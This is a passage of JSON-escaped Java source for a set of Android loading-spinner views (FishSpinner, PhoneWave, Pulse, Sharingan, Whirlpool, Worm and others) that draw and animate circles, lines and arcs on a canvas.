\u003c circlesSize; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setAlpha(126);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tcircles[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(45 * i, center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class FishSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int numberOfCircle;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic FishSpinner() {\n\t\t\t\t\tnumberOfCircle \u003d 5;\n\t\t\t\t\trotates \u003d new float[numberOfCircle];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[numberOfCircle];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * i / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1700);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 100);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic abstract class GraphicObject {\n\t\t\t\tprotected android.graphics.Paint paint;\n\n\t\t\t\tpublic GraphicObject() {\n\t\t\t\t\tpaint \u003d new android.graphics.Paint();\n\t\t\t\t\tpaint.setAntiAlias(true);\n\t\t\t\t}\n\n\t\t\t\tpublic void setColor(int color) {\n\t\t\t\t\tpaint.setColor(color);\n\t\t\t\t}\n\n\t\t\t\tpublic void setAlpha(int alpha) {\n\t\t\t\t\tpaint.setAlpha(alpha);\n\t\t\t\t}\n\n\t\t\t\tpublic void setWidth(float width) {\n\t\t\t\t\tpaint.setStrokeWidth(width);\n\t\t\t\t}\n\n\t\t\t\tpublic void setStyle(android.graphics.Paint.Style style) {\n\t\t\t\t\tpaint.setStyle(style);\n\t\t\t\t}\n\n\t\t\t\tpublic abstract void draw(android.graphics.Canvas canvas);\n\t\t\t}\n\n\n\t\t\tpublic interface InvalidateListener {\n\t\t\t\tvoid reDraw();\n\t\t\t}\n\n\t\t\tpublic class InvalidNumberOfPulseException extends Exception {\n\n\t\t\t\t@Override public String getMessage() {\n\t\t\t\t\treturn \"The number of pulse must be between 2 and 6\";\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Line extends GraphicObject {\n\t\t\t\tprivate PointF point1;\n\t\t\t\tprivate PointF point2;\n\n\t\t\t\tpublic void setPoint1(PointF point1) {\n\t\t\t\t\tthis.point1 \u003d point1;\n\t\t\t\t}\n\n\t\t\t\tpublic void setPoint2(PointF point2) {\n\t\t\t\t\tthis.point2 \u003d point2;\n\t\t\t\t}\n\n\t\t\t\tpublic PointF getPoint1() {\n\t\t\t\t\treturn point1;\n\t\t\t\t}\n\n\t\t\t\tpublic PointF getPoint2() {\n\t\t\t\t\treturn point2;\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.drawLine(point1.x, point1.y, point2.x, point2.y, paint);\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class LineSpinner extends LoaderView {\n\t\t\t\tprivate Line[] lines;\n\t\t\t\tprivate int numberOfLine;\n\n\t\t\t\tpublic LineSpinner() {\n\t\t\t\t\tnumberOfLine \u003d 8;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tint size \u003d Math.min(width, height);\n\t\t\t\t\tfloat lineWidth \u003d size / 10f;\n\t\t\t\t\tlines \u003d new Line[numberOfLine];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tlines[i] \u003d new Line();\n\t\t\t\t\t\tlines[i].setColor(color);\n\t\t\t\t\t\tlines[i].setAlpha(126);\n\t\t\t\t\t\tlines[i].setWidth(lineWidth);\n\t\t\t\t\t\tlines[i].setPoint1(new PointF(center.x, center.y - size / 2f + lineWidth));\n\t\t\t\t\t\tlines[i].setPoint2(new PointF(center.x, lines[i].getPoint1().y + 2 * lineWidth));\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tlines[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLine; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(45 * i, center.x, center.y);\n\t\t\t\t\t\tlines[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class PhoneWave extends LoaderView {\n\t\t\t\tprivate Arc[] arcs;\n\t\t\t\tprivate int numberOfArc;\n\n\t\t\t\tpublic PhoneWave() {\n\t\t\t\t\tnumberOfArc \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\tarcs \u003d new Arc[numberOfArc];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfloat d \u003d r / 4 + i * r / 4;\n\t\t\t\t\t\tarcs[i] \u003d new Arc();\n\t\t\t\t\t\tarcs[i].setColor(color);\n\t\t\t\t\t\tarcs[i].setAlpha(126);\n\t\t\t\t\t\tarcs[i].setOval(new android.graphics.RectF(center.x - d, center.y - d + r / 3, center.x + d, center.y + d + r / 3));\n\t\t\t\t\t\tarcs[i].setStartAngle(225);\n\t\t\t\t\t\tarcs[i].setSweepAngle(90);\n\t\t\t\t\t\tarcs[i].setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\t\tarcs[i].setWidth(r / 10f);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofInt(126, 255, 126);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1000);\n\t\t\t\t\t\tfadeAnimator.setStartDelay(i * 120);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tarcs[index].setAlpha((int)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tarcs[i].draw(canvas);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Pulse extends LoaderView {\n\t\t\t\tprivate Line[] lines;\n\t\t\t\tprivate int numberOfLines;\n\t\t\t\tprivate float lineWidth;\n\t\t\t\tprivate float lineDistance;\n\t\t\t\tprivate float[] scaleY;\n\n\t\t\t\tpublic Pulse(int numberOfLines) throws InvalidNumberOfPulseException {\n\t\t\t\t\tif (numberOfLines \u003c 3 || numberOfLines \u003e 5) {\n\t\t\t\t\t\tthrow new InvalidNumberOfPulseException();\n\t\t\t\t\t}\n\n\t\t\t\t\tthis.numberOfLines \u003d numberOfLines;\n\t\t\t\t\tlines \u003d new Line[numberOfLines];\n\t\t\t\t\tscaleY \u003d new float[numberOfLines];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tlineWidth \u003d width / (2 * numberOfLines);\n\t\t\t\t\tlineDistance \u003d lineWidth / 4f;\n\t\t\t\t\tfloat firstX \u003d (width - (lineWidth * numberOfLines + lineDistance * (numberOfLines - 1))) / 2f + lineWidth / 2f;\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tlines[i] \u003d new Line();\n\t\t\t\t\t\tlines[i].setColor(color);\n\t\t\t\t\t\tlines[i].setWidth(lineWidth);\n\t\t\t\t\t\tlines[i].setPoint1(new PointF(firstX, center.y - height / 4f));\n\t\t\t\t\t\tlines[i].setPoint2(new PointF(firstX, center.y + height / 4f));\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\t\t\t\t\t\tandroid.animation.ValueAnimator scaleAnimator \u003d android.animation.ValueAnimator.ofFloat(1f, 1.5f, 1f);\n\t\t\t\t\t\tscaleAnimator.setDuration(1000);\n\t\t\t\t\t\tscaleAnimator.setStartDelay(i * 120);\n\t\t\t\t\t\tscaleAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tscaleAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tscaleY[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tscaleAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfLines; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.translate(i * (lineWidth + lineDistance), 0);\n\t\t\t\t\t\tcanvas.scale(1, scaleY[i], lines[i].getPoint1().x, center.y);\n\t\t\t\t\t\tlines[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Radar extends LoaderView {\n\t\t\t\tprivate Line line;\n\t\t\t\tprivate float degree;\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tline \u003d new Line();\n\t\t\t\t\tline.setPoint1(center);\n\t\t\t\t\tline.setPoint2(new PointF(0, size / 2f));\n\t\t\t\t\tline.setColor(color);\n\t\t\t\t\tline.setWidth(5);\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tandroid.animation.ValueAnimator animator \u003d android.animation.ValueAnimator.ofFloat(0, 359);\n\t\t\t\t\tanimator.setDuration(1000);\n\t\t\t\t\tanimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\tanimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\tdegree \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tanimator.start();\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.save();\n\t\t\t\t\tcanvas.rotate(degree, center.x, center.y);\n\t\t\t\t\tline.draw(canvas);\n\t\t\t\t\tcanvas.restore();\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Sharingan extends LoaderView {\n\t\t\t\tprivate Circle eye;\n\t\t\t\tprivate Circle eyeBound;\n\t\t\t\tprivate Circle[] sharingans;\n\t\t\t\tprivate int numberOfSharingan;\n\t\t\t\tprivate float rotate;\n\t\t\t\tprivate float scale;\n\t\t\t\tprivate float eyeBoundRadius;\n\t\t\t\tprivate float eyeBoundRadiusScale;\n\n\t\t\t\tpublic Sharingan() {\n\t\t\t\t\tnumberOfSharingan \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\teyeBoundRadius \u003d r / 1.5f;\n\n\t\t\t\t\teye \u003d new Circle();\n\t\t\t\t\teye.setCenter(center.x, center.y);\n\t\t\t\t\teye.setColor(color);\n\t\t\t\t\teye.setRadius(r / 4);\n\n\t\t\t\t\teyeBound \u003d new Circle();\n\t\t\t\t\teyeBound.setCenter(center.x, center.y);\n\t\t\t\t\teyeBound.setColor(color);\n\t\t\t\t\teyeBound.setRadius(eyeBoundRadius);\n\t\t\t\t\teyeBound.setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\teyeBound.setWidth(r / 20f);\n\n\t\t\t\t\tsharingans \u003d new Circle[numberOfSharingan];\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfSharingan; i++) {\n\t\t\t\t\t\tsharingans[i] \u003d new Circle();\n\t\t\t\t\t\tsharingans[i].setCenter(center.x, center.y - eyeBoundRadius);\n\t\t\t\t\t\tsharingans[i].setColor(color);\n\t\t\t\t\t\tsharingans[i].setRadius(r / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tandroid.animation.ValueAnimator rotateAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\trotateAnimator.setDuration(1500);\n\t\t\t\t\trotateAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\trotateAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\trotate \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tandroid.animation.ValueAnimator scaleAnimator \u003d android.animation.ValueAnimator.ofFloat(1f, 0.8f, 1f);\n\t\t\t\t\tscaleAnimator.setDuration(1000);\n\t\t\t\t\tscaleAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\tscaleAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\tscale \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\t\t\t\tandroid.animation.AnimatorSet animatorSet \u003d new android.animation.AnimatorSet();\n\t\t\t\t\tanimatorSet.play(rotateAnimator).with(scaleAnimator);\n\t\t\t\t\tanimatorSet.start();\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tcanvas.save();\n\t\t\t\t\tcanvas.scale(scale, scale, center.x, center.y);\n\t\t\t\t\tcanvas.rotate(rotate, center.x, center.y);\n\t\t\t\t\teye.draw(canvas);\n\t\t\t\t\teyeBound.draw(canvas);\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfSharingan; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(i * 120, center.x, center.y);\n\t\t\t\t\t\tsharingans[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t\tcanvas.restore();\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class TwinFishesSpinner extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int numberOfCircle;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic TwinFishesSpinner() {\n\t\t\t\t\tnumberOfCircle \u003d 10;\n\t\t\t\t\trotates \u003d new float[numberOfCircle];\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfinal float size \u003d Math.min(width, height);\n\t\t\t\t\tfinal float circleRadius \u003d size / 10.0f;\n\t\t\t\t\tcircles \u003d new Circle[numberOfCircle];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle / 2; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * i / 6);\n\t\t\t\t\t}\n\n\t\t\t\t\tfor (int i \u003d numberOfCircle / 2; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setCenter(center.x, size - circleRadius);\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(circleRadius - circleRadius * (i - 5) / 6);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(0, 360);\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration(1700);\n\t\t\t\t\t\tfadeAnimator.setStartDelay((index \u003e\u003d 5 ? index - 5 : index) * 100);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfCircle; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tcircles[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\t\t\tpublic class Whirlpool extends LoaderView {\n\t\t\t\tprivate Arc[] arcs;\n\t\t\t\tprivate int numberOfArc;\n\t\t\t\tprivate float[] rotates;\n\n\t\t\t\tpublic Whirlpool() {\n\t\t\t\t\tnumberOfArc \u003d 3;\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tfloat r \u003d Math.min(width, height) / 2f;\n\t\t\t\t\tarcs \u003d new Arc[numberOfArc];\n\t\t\t\t\trotates \u003d new float[numberOfArc];\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tfloat d \u003d r / 4 + i * r / 4;\n\t\t\t\t\t\tarcs[i] \u003d new Arc();\n\t\t\t\t\t\tarcs[i].setColor(color);\n\t\t\t\t\t\tarcs[i].setOval(new android.graphics.RectF(center.x - d, center.y - d, center.x + d, center.y + d));\n\t\t\t\t\t\tarcs[i].setStartAngle(i * 45);\n\t\t\t\t\t\tarcs[i].setSweepAngle(i * 45 + 90);\n\t\t\t\t\t\tarcs[i].setStyle(android.graphics.Paint.Style.STROKE);\n\t\t\t\t\t\tarcs[i].setWidth(r / 10f);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d numberOfArc - 1; i \u003e\u003d 0; i--) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\n\t\t\t\t\t\tandroid.animation.ValueAnimator fadeAnimator \u003d android.animation.ValueAnimator.ofFloat(arcs[i].getStartAngle(),\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t   arcs[i].getStartAngle() + 360* (i %2$s 2 \u003d\u003d 0 ? -1 : 1));\n\t\t\t\t\t\tfadeAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\tfadeAnimator.setDuration((i + 1) * 500);\n\t\t\t\t\t\tfadeAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\trotates[index] \u003d (float)animation.getAnimatedValue();\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\tfadeAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c numberOfArc; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.rotate(rotates[i], center.x, center.y);\n\t\t\t\t\t\tarcs[i].draw(canvas);\n\t\t\t\t\t\tcanvas.restore();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\n\n\t\t\tpublic class Worm extends LoaderView {\n\t\t\t\tprivate Circle[] circles;\n\t\t\t\tprivate int circlesSize;\n\t\t\t\tprivate float radius;\n\t\t\t\tprivate int[] transformations;\n\n\t\t\t\tpublic Worm() {\n\t\t\t\t\tcirclesSize \u003d 5;\n\t\t\t\t\ttransformations \u003d new int[]{-2, -1, 0, 1, 2};\n\t\t\t\t}\n\n\t\t\t\t@Override public void initializeObjects() {\n\t\t\t\t\tcircles \u003d new Circle[circlesSize];\n\t\t\t\t\tradius \u003d width / 10f - width / 100f;\n\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcircles[i] \u003d new Circle();\n\t\t\t\t\t\tcircles[i].setColor(color);\n\t\t\t\t\t\tcircles[i].setRadius(radius);\n\t\t\t\t\t\tcircles[i].setCenter(center.x, center.y);\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void setUpAnimation() {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tfinal int index \u003d i;\n\t\t\t\t\t\tandroid.animation.ValueAnimator translateAnimator \u003d android.animation.ValueAnimator.ofFloat(center.y, height / 4f, height * 3 / 4f, center.y);\n\t\t\t\t\t\ttranslateAnimator.setDuration(1000);\n\t\t\t\t\t\ttranslateAnimator.setStartDelay(index * 120);\n\t\t\t\t\t\ttranslateAnimator.setRepeatCount(android.animation.ValueAnimator.INFINITE);\n\t\t\t\t\t\ttranslateAnimator.addUpdateListener(new android.animation.ValueAnimator.AnimatorUpdateListener() {\n\t\t\t\t\t\t\t\t@Override public void onAnimationUpdate(android.animation.ValueAnimator animation) {\n\t\t\t\t\t\t\t\t\tcircles[index].setCenter(center.x, (float)animation.getAnimatedValue());\n\t\t\t\t\t\t\t\t\tif (invalidateListener !\u003d null) {\n\t\t\t\t\t\t\t\t\t\tinvalidateListener.reDraw();\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\n\t\t\t\t\t\ttranslateAnimator.start();\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t@Override public void draw(android.graphics.Canvas canvas) {\n\t\t\t\t\tfor (int i \u003d 0; i \u003c circlesSize; i++) {\n\t\t\t\t\t\tcanvas.save();\n\t\t\t\t\t\tcanvas.translate(2 * radius * transformations[i], 